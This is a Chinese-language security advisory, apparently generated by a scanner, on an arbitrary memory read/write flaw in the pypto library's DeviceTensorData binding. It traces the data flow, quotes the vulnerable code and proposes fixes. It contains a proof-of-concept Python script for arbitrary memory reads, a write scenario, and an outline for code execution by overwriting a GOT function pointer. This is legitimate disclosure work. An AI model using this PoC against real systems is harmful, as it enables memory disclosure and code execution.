# VULN-DF-MEM-001：DeviceTensorData任意内存访问漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-MEM-001 |
| **类型** | 内存损坏 (Memory Corruption) |
| **CWE** | CWE-787: Out-of-bounds Write |
| **严重性** | Critical |
| **置信度** | 85 |
| **状态** | CONFIRMED |
| **发现者** | dataflow-scanner |

## 漏洞位置

| 文件 | 行号 | 函数 |
|------|------|------|
| python/src/bindings/runtime.cpp | 129-230 | DeviceRunOnceDataFromHost |

## 关联漏洞

此漏洞是同一攻击链的一部分，与其他漏洞紧密关联：

- **VULN-DF-MEM-002**: pybind11 构造函数入口点
- **VULN-SEC-BIND-001**: 同一漏洞点的 Security Auditor 发现
- **VULN-SEC-PYAPI-001**: Python API 层入口点
- **VULN-DF-MEM-005**: Sink 点 (RawTensorData::CreateTensor)

## 完整攻击链分析

### 数据流路径

```
Python 用户输入
    ↓
pypto.Tensor(data_ptr, dtype, shape)          [VULN-SEC-PYAPI-001]
    ↓
_pto_to_tensor_data() [runtime.py:70-81]
    ↓
pypto_impl.DeviceTensorData(dtype, addr, shape)  [VULN-DF-MEM-002]
    ↓
DeviceTensorData.GetAddr() → 返回任意地址
    ↓
DeviceRunOnceDataFromHost() [runtime.cpp:129]
    ↓
RawTensorData::CreateTensor(dtype, shape, (uint8_t*)addr)  [VULN-DF-MEM-005]
    ↓
StringUtils::DataCopy(tensorData->data(), size, addr, size)  ← 任意内存读取
    ↓
DeviceRunOnce() → 设备执行
    ↓
StringUtils::DataCopy(output_addr, size, output->data(), size)  ← 任意内存写入
```

### 关键代码分析

#### 1. Python API 入口 (runtime.py:70-81)

```python
def _pto_to_tensor_data(tensors: List[pypto.Tensor]) -> List[pypto_impl.DeviceTensorData]:
    datas = []
    for t in tensors:
        data = pypto_impl.DeviceTensorData(
            t.dtype,
            t.data_ptr,       # ← 用户可传入任意值
            list(t.ori_shape),
        )
        datas.append(data)
    return datas
```

**问题**: `t.data_ptr` 来自 `pypto.Tensor` 对象，用户可以构造该对象并设置任意内存地址。

#### 2. pybind11 绑定入口 (runtime.cpp:1042-1048)

```cpp
py::class_<DeviceTensorData>(m, "DeviceTensorData")
    .def(py::init<DataType, uintptr_t, const std::vector<int64_t>&>(), 
         py::arg("dtype"), py::arg("addr"), py::arg("shape"))
```

**问题**: `uintptr_t addr` 参数直接从 Python 传入，无任何验证。攻击者可传入任意数值。

#### 3. DeviceTensorData 类 (device_launcher_binding.h:33-64)

```cpp
class DeviceTensorData {
public:
    DeviceTensorData(DataType dtype, uintptr_t addr, const std::vector<int64_t>& shape)
        : dtype_(dtype), addr_((void*)addr), shape_(shape)  // ← 直接赋值
    {}
    void* GetAddr() const { return addr_; }
    // ...
private:
    void* addr_;  // ← 存储任意地址
};
```

**问题**: 构造函数将 `uintptr_t` 直接转换为 `void*`，无边界检查、无所有权验证、无地址有效性验证。

#### 4. Sink 点 (runtime.cpp:129, raw_tensor_data.h:317-322)

```cpp
// runtime.cpp:129 - DeviceRunOnceDataFromHost
auto rawData = RawTensorData::CreateTensor(
    inputs[i].GetDataType(), 
    logicalShape, 
    (uint8_t*)inputs[i].GetAddr()  // ← 使用任意地址
);

// raw_tensor_data.h:317-322 - CreateTensor
static std::shared_ptr<RawTensorData> CreateTensor(
    DataType dtype, const std::vector<int64_t>& shape, uint8_t* data) {
    auto tensorData = std::make_shared<RawTensorData>(dtype, shape);
    StringUtils::DataCopy(tensorData->data(), tensorData->GetDataSize(), 
                          data, tensorData->GetDataSize());  // ← 从任意地址拷贝
    return tensorData;
}
```

**问题**: `StringUtils::DataCopy` 从用户提供的 `data` 指针拷贝数据到内部缓冲区。如果 `data` 是任意地址，将发生任意内存读取。

#### 5. 输出写入 (runtime.cpp:220)

```cpp
StringUtils::DataCopy(outputs[i].GetAddr(), output->GetDataSize(), 
                      output->data(), output->GetDataSize());
```

**问题**: 输出数据写回到 `outputs[i].GetAddr()`，这也是用户控制的地址，可实现任意内存写入。

## 攻击场景

### 场景1: 信息泄露 (任意内存读取)

攻击者构造恶意 Tensor，设置 `data_ptr` 为目标进程内存地址：

```python
import pypto
import pypto_impl

# 构造恶意 Tensor，data_ptr 指向目标地址
class MaliciousTensor:
    dtype = pypto.DT_FP16
    data_ptr = 0x7fff0000dead  # 目标内存地址
    ori_shape = [1024, 1024]

# 触发内存读取
malicious_input = MaliciousTensor()
pypto_impl.DeviceRunOnceDataFromHost([malicious_input], [])
# 内核将从 0x7fff0000dead 读取 2MB 数据
```

### 场景2: 内存破坏 (任意内存写入)

攻击者同时控制输入和输出的 `data_ptr`：

```python
# 输入指向可读区域
input_tensor.data_ptr = known_data_addr
input_tensor.ori_shape = [1024]

# 输出指向目标写入地址
output_tensor.data_ptr = target_write_addr
output_tensor.ori_shape = [1024]

# 执行后，目标地址被写入数据
pypto_impl.DeviceRunOnceDataFromHost([input_tensor], [output_tensor])
```

### 场景3: 代码执行 (函数指针覆盖)

结合信息泄露和内存写入，攻击者可以：
1. 读取 GOT 表中的函数指针
2. 计算 libc 中 system() 的地址
3. 覆盖函数指针为 system()
4. 触发函数调用实现代码执行

## 利用条件

| 条件 | 是否满足 | 说明 |
|------|----------|------|
| 用户可构造 pypto.Tensor | ✓ | Tensor 类允许设置 data_ptr |
| pybind11 绑定暴露 | ✓ | DeviceTensorData 构造函数直接暴露 |
| 地址无验证 | ✓ | uintptr_t 直接转为 void* |
| 内存拷贝执行 | ✓ | StringUtils::DataCopy 确定执行 |
| shape 控制大小 | ✓ | 用户可指定任意 shape 控制拷贝量 |

## 影响范围

### 直接影响

- **任意内存读取**: 可读取进程任意地址的内容
- **任意内存写入**: 可向进程任意地址写入数据
- **信息泄露**: 读取敏感数据（密钥、密码、内部数据结构）
- **权限提升**: 覆盖关键数据结构实现权限提升

### 间接影响

- **远程代码执行**: 结合其他技术可实现 RCE
- **沙箱逃逸**: 突破 Python 虚拟机的内存隔离
- **设备安全**: 污染 NPU 设备内存

## PoC 构造

```python
#!/usr/bin/env python3
"""
PoC: Arbitrary Memory Read via DeviceTensorData
Target: VULN-DF-MEM-001 Attack Chain
"""

import pypto
import pypto_impl

def arbitrary_read(target_addr, size_bytes):
    """读取任意内存地址的内容"""
    # 构造恶意输入 Tensor
    class MaliciousTensor:
        dtype = pypto.DT_UINT8
        data_ptr = target_addr
        ori_shape = [size_bytes]
    
    # 正常输出 Tensor (用于接收数据)
    output = pypto.Tensor(pypto.DT_UINT8, [size_bytes])
    
    # 触发漏洞
    # DeviceRunOnceDataFromHost 将从 target_addr 读取 size_bytes 数据
    pypto_impl.DeviceRunOnceDataFromHost([MaliciousTensor()], [output])
    
    return output  # 包含读取的内存内容

# 示例: 读取栈上某个地址
leaked_data = arbitrary_read(0x7fffffffe000, 4096)
print(f"Leaked {len(leaked_data)} bytes from target address")
```

## 修复建议

### 优先级 P0: 地址验证

在 `DeviceTensorData` 构造函数中添加地址验证：

```cpp
class DeviceTensorData {
public:
    DeviceTensorData(DataType dtype, uintptr_t addr, const std::vector<int64_t>& shape)
        : dtype_(dtype), shape_(shape) {
        // 验证地址来自有效的 Tensor 对象
        if (!ValidateTensorAddress(addr)) {
            throw std::invalid_argument("Invalid tensor address");
        }
        addr_ = (void*)addr;
    }

private:
    static bool ValidateTensorAddress(uintptr_t addr) {
        // 检查地址是否在已知 Tensor 内存池范围内
        // 或要求用户提供 Tensor 对象而非裸指针
        return TensorMemoryPool::IsValidAddress(addr);
    }
};
```

### 优先级 P1: 接口重构

修改 Python API，不接受裸指针：

```python
def _pto_to_tensor_data(tensors: List[pypto.Tensor]) -> List[pypto_impl.DeviceTensorData]:
    datas = []
    for t in tensors:
        # 验证 Tensor 是有效的 torch.Tensor 或 pypto.Tensor
        if not isinstance(t, (torch.Tensor, pypto.Tensor)):
            raise TypeError("Invalid tensor type")
        
        # 使用内部验证过的 data_ptr
        validated_addr = ValidateAndGetAddr(t)
        data = pypto_impl.DeviceTensorData(
            t.dtype,
            validated_addr,  # 验证后的地址
            list(t.ori_shape),
        )
        datas.append(data)
    return datas
```

### 优先级 P2: 内存边界检查

在 `StringUtils::DataCopy` 中添加边界检查：

```cpp
void StringUtils::DataCopy(void* dst, size_t dst_size, const void* src, size_t src_size) {
    // 验证源地址可读
    if (!IsAddressReadable(src, src_size)) {
        throw MemoryAccessException("Source address not readable");
    }
    // 验证目标地址可写
    if (!IsAddressWritable(dst, dst_size)) {
        throw MemoryAccessException("Destination address not writable");
    }
    // 执行拷贝
    memcpy(dst, src, std::min(dst_size, src_size));
}
```

## 修复验证标准

1. 传入无效地址时应抛出异常而非崩溃
2. 无法使用任意地址进行内存操作
3. 所有 Tensor 地址需通过验证机制
4. 添加单元测试验证边界情况

## 参考链接

- CWE-787: Out-of-bounds Write - https://cwe.mitre.org/data/definitions/787.html
- CWE-125: Out-of-bounds Read - https://cwe.mitre.org/data/definitions/125.html